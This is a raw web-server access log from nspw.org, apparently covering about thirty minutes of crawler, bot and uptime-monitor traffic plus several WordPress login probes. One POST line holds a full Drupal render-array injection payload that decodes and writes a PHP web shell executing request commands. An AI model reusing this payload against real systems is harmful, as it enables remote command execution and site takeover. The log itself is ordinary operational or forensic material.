www.nspw.org:80 46.229.168.75 - - [30/Apr/2018:21:02:46 -0400] "GET /2009/proceedings/2012/forms/index.htm HTTP/1.1" 302 566 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 41.66.199.105 - - [30/Apr/2018:21:02:51 -0400] "GET / HTTP/1.1" 302 529 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 46.229.168.80 - - [30/Apr/2018:21:03:06 -0400] "GET /proceedings/2013 HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:21:03:38 -0400] "GET /papers/1993/?C=D%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.79 - - [30/Apr/2018:21:04:09 -0400] "GET /2009/proceedings/1997/?C=M%3BO%3DA HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.79 - - [30/Apr/2018:21:04:25 -0400] "GET /2009/dates.shtml HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:21:04:43 -0400] "GET /2005/past.content HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.74 - - [30/Apr/2018:21:05:29 -0400] "GET /2005/nspw-header.shtml HTTP/1.1" 302 536 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.78 - - [30/Apr/2018:21:05:56 -0400] "GET /proceedings/2002 HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:21:05:57 -0400] "GET /2018 HTTP/1.1" 302 500 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:21:06:19 -0400] "GET /2009/invite/workshopformat.html HTTP/1.1" 302 554 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.69.10 - - [30/Apr/2018:21:06:21 -0400] "GET /papers/2012/docs/p127.pdf HTTP/1.1" 302 590 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [30/Apr/2018:21:06:21 -0400] "GET /2009/proceedings/1997/nspw1997-somayaji-scanned.pdf HTTP/1.1" 302 631 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:21:06:41 -0400] "GET /2005/invite/ HTTP/1.1" 302 516 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.74 - - [30/Apr/2018:21:06:53 -0400] "GET /2006/cfp/?C=M%3BO%3DA HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:21:07:27 -0400] "GET /2008/oc.content.2007 HTTP/1.1" 302 532 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:21:07:45 -0400] "GET /2011/dates HTTP/1.1" 302 512 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:21:07:46 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 216.244.66.200 - - [30/Apr/2018:21:07:56 -0400] "GET /papers/2002/?C=D;O=A HTTP/1.1" 302 513 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 46.229.168.75 - - [30/Apr/2018:21:08:16 -0400] "GET /2009/proceedings/2012/ HTTP/1.1" 302 536 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:21:08:40 -0400] "GET /2005/filelist.xml.hold HTTP/1.1" 302 536 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:08:53 -0400] "GET /papers/2009/ HTTP/1.1" 302 516 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:21:08:53 -0400] "GET /2005/filelist.xml.hold HTTP/1.1" 302 536 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.82 - - [30/Apr/2018:21:08:55 -0400] "GET /papers/2013/nspw2013-castro.pdf HTTP/1.1" 302 591 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:21:09:16 -0400] "GET /2006/cfp.shtml HTTP/1.1" 302 520 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 111.206.59.133 - - [30/Apr/2018:21:09:37 -0400] "GET / HTTP/1.1" 302 473 "http://www.so.com" "Mozilla/5.0 (Windows NT 6.2; rv:30.0) Gecko/20150101 Firefox/32.0 360Spider 360Spider"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:21:09:42 -0400] "GET /2017/location HTTP/1.1" 302 518 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.80 - - [30/Apr/2018:21:09:42 -0400] "GET /papers/2010/nspw2010-faily.pdf HTTP/1.1" 302 589 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 54.36.148.19 - - [30/Apr/2018:21:09:47 -0400] "GET /2008/nspw-footer.html HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:21:09:58 -0400] "GET /2005/cfp.shtml HTTP/1.1" 302 520 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.72 - - [30/Apr/2018:21:10:10 -0400] "GET /papers/2010/nspw2010-sun.pdf HTTP/1.1" 302 585 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:21:10:41 -0400] "GET /papers/ HTTP/1.1" 302 506 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.75 - - [30/Apr/2018:21:10:43 -0400] "GET /2009/proceedings/ HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:21:10:59 -0400] "GET /papers/1999/ HTTP/1.1" 302 516 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:21:11:24 -0400] "GET /proceedings/2000 HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:11:47 -0400] "GET /2002/pc.shtml HTTP/1.1" 302 518 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:21:12:11 -0400] "GET /2008/invite-old/reg.html HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.75 - - [30/Apr/2018:21:12:26 -0400] "GET /papers/1993/?C=S%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:21:12:46 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:21:12:57 -0400] "GET /2015/dates HTTP/1.1" 302 512 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.75 - - [30/Apr/2018:21:13:22 -0400] "GET /2009/proceedings/1995/?C=D%3BO%3DA HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.77 - - [30/Apr/2018:21:13:34 -0400] "GET /2003/pc.shtml.bak HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 185.183.105.174 - - [30/Apr/2018:21:13:37 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 185.183.105.174 - - [30/Apr/2018:21:13:38 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 73.185.4.255 - - [30/Apr/2018:21:13:53 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 66.249.73.72 - - [30/Apr/2018:21:13:54 -0400] "GET /papers/1997/nspw1997-rahman.pdf HTTP/1.1" 302 591 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 73.185.4.255 - - [30/Apr/2018:21:13:54 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:21:14:04 -0400] "GET /2009/proceedings/2013/?C=S%3BO%3DA HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 58.250.125.159 - - [30/Apr/2018:21:14:11 -0400] "GET /robots.txt HTTP/1.1" 302 512 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:21:14:27 -0400] "GET /2008/nspw2008-cfpTwk.html HTTP/1.1" 302 542 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:21:14:40 -0400] "GET /2009/proceedings/1993/ HTTP/1.1" 302 536 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 41.101.183.60 - - [30/Apr/2018:21:15:07 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:21:15:08 -0400] "GET /2009/proceedings/1998/?C=N%3BO%3DD HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 41.101.183.60 - - [30/Apr/2018:21:15:09 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 85.245.172.131 - - [30/Apr/2018:21:15:09 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 85.245.172.131 - - [30/Apr/2018:21:15:12 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:21:15:22 -0400] "GET /2008/?C=M%3BO%3DA HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 58.250.125.159 - - [30/Apr/2018:21:15:33 -0400] "GET /papers/1993/nspw1993-desmedt.pdf HTTP/1.1" 302 556 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:21:15:54 -0400] "GET /2013/program HTTP/1.1" 302 516 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.75 - - [30/Apr/2018:21:16:12 -0400] "GET /2009/proceedings/1997/ HTTP/1.1" 302 536 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:21:16:33 -0400] "GET /2014 HTTP/1.1" 302 500 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:21:16:54 -0400] "GET /papers/1994?C=M%3BO%3DA HTTP/1.1" 302 538 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 40.77.167.128 - - [30/Apr/2018:21:17:06 -0400] "GET /papers/2003/nspw2003-duvarney.pdf HTTP/1.1" 302 595 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
www.nspw.org:80 46.229.168.78 - - [30/Apr/2018:21:17:28 -0400] "GET /2009/proceedings/1993/?C=S%3BO%3DA HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.74 - - [30/Apr/2018:21:17:39 -0400] "GET /2009/tmp/ HTTP/1.1" 302 510 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:21:17:46 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:21:18:00 -0400] "GET /2009/cfp.shtml HTTP/1.1" 302 520 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.65 - - [30/Apr/2018:21:18:20 -0400] "GET /2006/pc.contentQQ HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:18:35 -0400] "GET /proceedings/2013 HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:21:18:58 -0400] "GET /2009/proceedings/2012/forms/authors.htm HTTP/1.1" 302 570 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:21:19:20 -0400] "GET /2004/program.shtml HTTP/1.1" 302 528 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.72 - - [30/Apr/2018:21:19:25 -0400] "GET /2009/proceedings/2014-pre/almeshekah-nspw2014pre.pdf HTTP/1.1" 302 633 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:21:19:39 -0400] "GET /proceedings/1994 HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.65 - - [30/Apr/2018:21:19:57 -0400] "GET /2008/?C=N%3BO%3DD HTTP/1.1" 302 526 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 143.52.89.149 - - [30/Apr/2018:21:20:12 -0400] "GET /papers/2004/nspw2004-sadeghi.pdf HTTP/1.1" 302 593 "http://scholar.google.co.uk/" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
www.nspw.org:80 46.229.168.80 - - [30/Apr/2018:21:20:30 -0400] "GET /1999/oc.html HTTP/1.1" 302 516 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 66.249.73.76 - - [30/Apr/2018:21:20:35 -0400] "GET /papers/1999/nspw1999-henning.pdf HTTP/1.1" 302 593 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:21:20:36 -0400] "GET /papers/1999?C=D%3BO%3DA HTTP/1.1" 302 538 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.73 - - [30/Apr/2018:21:21:01 -0400] "GET /papers/2010/?C=N%3BO%3DD HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 143.52.89.149 - - [30/Apr/2018:21:21:03 -0400] "-" 408 0 "-" "-"
www.nspw.org:80 46.229.168.65 - - [30/Apr/2018:21:21:32 -0400] "GET /2005/dates.shtml HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:21:21:41 -0400] "GET /2016/location HTTP/1.1" 302 518 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.65 - - [30/Apr/2018:21:22:12 -0400] "GET /2005/cfp/latex/ieee.bst HTTP/1.1" 302 538 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:22:29 -0400] "GET /proceedings/1997 HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:21:22:46 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:21:22:50 -0400] "GET /2015 HTTP/1.1" 302 500 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.65 - - [30/Apr/2018:21:23:21 -0400] "GET /2008/ieee.cls HTTP/1.1" 302 518 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:21:23:48 -0400] "GET /proceedings/2010 HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:21:23:59 -0400] "GET /2003/papers.shtml.bak HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:21:24:10 -0400] "GET /2005/program.shtml HTTP/1.1" 302 528 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:21:24:35 -0400] "GET /2009/nspw-footer.html HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.76 - - [30/Apr/2018:21:25:00 -0400] "GET /2009/finaid.content HTTP/1.1" 302 530 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:21:25:23 -0400] "GET /2009/proceedings/2008/?C=D%3BO%3DA HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.70 - - [30/Apr/2018:21:25:44 -0400] "GET /2017/program HTTP/1.1" 302 516 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 54.36.148.164 - - [30/Apr/2018:21:25:54 -0400] "GET /2005/cfp/latex/tr.tex HTTP/1.1" 302 515 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 46.229.168.65 - - [30/Apr/2018:21:26:00 -0400] "GET /2008/nspw-header.html HTTP/1.1" 302 534 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:21:26:33 -0400] "GET /2012/submissions HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 59.124.153.166 - - [30/Apr/2018:21:26:36 -0400] "POST /?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=echo%20PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9%20%7C%20base64%20-d%20%7C%20tee%20owotg.php HTTP/1.1" 302 980 "-" "curl/7.47.0"
www.nspw.org:80 46.229.168.66 - - [30/Apr/2018:21:26:51 -0400] "GET /papers/2005/?C=S%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.74 - - [30/Apr/2018:21:27:16 -0400] "GET /papers/2007/?C=M%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 27.125.203.2 - - [30/Apr/2018:21:27:33 -0400] "GET /wp-login.php HTTP/1.1" 302 553 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:21:27:34 -0400] "GET /papers/2012/forms/authors.htm HTTP/1.1" 302 550 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 27.125.203.2 - - [30/Apr/2018:21:27:38 -0400] "GET / HTTP/1.1" 302 528 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
www.nspw.org:80 216.244.66.200 - - [30/Apr/2018:21:27:45 -0400] "GET /current HTTP/1.1" 302 487 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:21:27:46 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:27:54 -0400] "GET /papers/2001/?C=D%3BO%3DA HTTP/1.1" 302 540 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:21:28:15 -0400] "GET /papers/2012/ HTTP/1.1" 302 516 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:28:38 -0400] "GET /2008/dates.shtml HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 54.36.149.19 - - [30/Apr/2018:21:28:44 -0400] "GET /2008/index.shtml HTTP/1.1" 302 505 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:21:29:07 -0400] "GET /2002/pc.content HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:29:23 -0400] "GET /2007 HTTP/1.1" 302 500 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:21:29:48 -0400] "GET /2003/index.content HTTP/1.1" 302 528 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.67 - - [30/Apr/2018:21:30:06 -0400] "GET /2005/texput.log HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:21:30:30 -0400] "GET /2004/oc.content HTTP/1.1" 302 522 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.71 - - [30/Apr/2018:21:30:54 -0400] "GET /node/52 HTTP/1.1" 302 506 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.74 - - [30/Apr/2018:21:31:30 -0400] "GET /2009/proceedings/2008/?C=M%3BO%3DA HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.74 - - [30/Apr/2018:21:31:43 -0400] "GET /2009/proceedings/2008/?C=M%3BO%3DA HTTP/1.1" 302 560 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.79 - - [30/Apr/2018:21:32:10 -0400] "GET /papers/1996?C=D%3BO%3DA HTTP/1.1" 302 538 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.72 - - [30/Apr/2018:21:32:24 -0400] "GET /2003/index.shtml.bak HTTP/1.1" 302 532 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.78 - - [30/Apr/2018:21:32:29 -0400] "GET /2010/program HTTP/1.1" 302 516 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 46.229.168.68 - - [30/Apr/2018:21:32:45 -0400] "GET /proceedings/2003 HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
www.nspw.org:80 69.162.124.227 - - [30/Apr/2018:21:32:46 -0400] "HEAD / HTTP/1.1" 302 188 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
www.nspw.org:80 46.229.168.69 - - [30/Apr/2018:21:33:06 -0400] "GET /2005/cfp/CFP.aux HTTP/1.1" 302 524 "-" "Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)"
